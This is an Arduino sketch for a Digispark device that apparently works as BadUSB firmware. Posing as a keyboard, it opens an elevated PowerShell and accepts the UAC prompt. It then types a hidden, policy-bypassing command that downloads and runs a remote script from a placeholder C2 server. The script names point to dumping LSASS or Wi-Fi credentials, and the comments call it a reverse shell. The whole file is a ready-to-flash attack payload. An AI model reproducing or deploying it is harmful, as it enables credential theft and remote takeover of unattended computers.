#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}
void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  
  // start elevated prompt
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // cmd with administrative privilege done

  DigiKeyboard.delay(5000);

  //Download powercat and setup reversed shell 
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.Webclient).DownloadString('http(s)://c2/webserver/url_to_Netsh-Ripper_OR_Send-LSASS-Dump.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
  // reversed shell done

  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  // second led on you can remove the badusb

}

